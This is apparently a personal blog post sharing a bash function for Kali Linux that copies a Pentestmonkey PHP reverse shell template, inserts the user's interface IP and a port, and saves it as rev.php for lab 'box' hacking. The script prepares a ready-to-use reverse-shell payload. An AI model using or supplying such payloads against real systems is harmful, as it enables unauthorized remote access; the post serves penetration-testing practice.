---
layout:     post
title:      Kali-Linux-QoL
date:       2019-09-21 15:20:20
author:     J
summary:    Life's too short
categories: General
thumbnail:  thumbs-up
tags:
 - Linux
 - Kali
---

This post will be updated once in a blue moon. Just wanted to share some of my stuff which I use as I think it's good to automate certain processes when hacking boxes. Life's too short to be repeating stuff all the time.


## PHP Reverse shell generator

This particular script is for generating a PHP reverse shell. Just append it to your `.bashrc` file and restart your terminal to use. The original script can be found on [Pentestmonkey here][1]. Just replace the ip address to 'ipaddress' and set the port to 443.
Alternatively, you can download the [pre-modified version on my Github][2] to use with this script. Change the directory in the script to where you saved the script to.

Usage: `phprev <Interface> <Optional: listening port>`


~~~bash

# Create PHP reverse shell in current directory. Usage example: phprev tun0 1234
# Defaults to port 443 if port is not specified

function phprev() {
phprevshelldir=/root/Try-Harder/Scripts/Shells/php-reverse-shell.php #CHANGE THIS
if [ $# -eq 0 ]; then echo "Please define interface"
else
    revip=`ifconfig $1 | head -n2 | tail -n1 | awk '{print $2}' `
    cp $phprevshelldir ./rev.php && sed -i 's/ipaddress/'$revip'/g' rev.php
        if [ $# -eq 2 ]; then
        revport=$2 ;
        sed -i 's/443/'$2'/g' rev.php
        else revport=443
        fi
    echo "PHP reverse shell(rev.php) created and configured to connect back to:" $revip:$revport
fi
}


~~~

[1]: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
[2]: https://github.com/Dreamscent/Try-Harder/blob/master/Scripts/Shells/php-reverse-shell.php
